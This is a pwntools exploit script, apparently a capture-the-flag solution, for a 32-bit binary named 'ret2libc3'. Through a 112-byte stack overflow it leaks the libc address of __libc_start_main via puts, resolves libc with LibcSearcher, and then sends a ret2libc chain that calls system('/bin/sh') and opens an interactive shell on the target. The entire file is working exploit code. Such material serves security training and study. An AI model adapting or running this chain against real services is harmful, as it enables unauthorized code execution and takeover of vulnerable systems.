#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./ret2libc3 --host localhost --port 9999
from pwn import *
from LibcSearcher import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2libc3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 9999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# leak got __libc_start_main

puts_address = exe.plt['puts']
main_address = exe.symbols['main']
libc_start = exe.got['__libc_start_main']


fuck = flat([
    'A' * 112, puts_address, main_address, libc_start
])


io.sendlineafter('Can you find it !?', fuck)

r = io.recv()

libc_real_address = u32(r[0:4])


libc = LibcSearcher('__libc_start_main', libc_real_address)



# sub offset and get libcbase address in server
libcbase = libc_real_address - libc.dump('__libc_start_main')

print 'libcbase ', libcbase
# # find system and /bin/bash
system_address = libcbase + libc.dump('system')
bin_bash_address = libcbase + libc.dump('str_bin_sh')



fuck = flat(
    ['A'*112, system_address, 0xdeadbeef, bin_bash_address]
)


io.sendline(fuck)
io.interactive()
